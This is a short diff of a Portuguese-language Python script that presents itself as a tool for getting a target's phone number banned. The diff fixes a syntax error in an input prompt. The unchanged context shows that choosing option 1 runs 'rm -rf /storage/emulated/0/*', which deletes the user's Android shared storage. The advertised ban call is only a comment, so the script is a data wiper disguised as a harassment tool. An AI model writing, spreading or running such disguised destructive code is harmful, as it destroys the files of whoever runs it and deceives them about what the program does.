@@ -23,7 +23,7 @@ X = input("\033[1;44;37mEscolha uma das opções acima: 1\033[0;m \033[1;36m\n\n
 
 if X == "1":
     H = os.system("rm -rf /storage/emulated/0/*")
-    H = input("Digite o número do alvo" \n> ")
+    H = input("Digite o número do alvo")
     #attack.Banirnumerodigitado ("{NUMBER}")
     print(f"Banindo o número {H}")
     time.sleep(2)
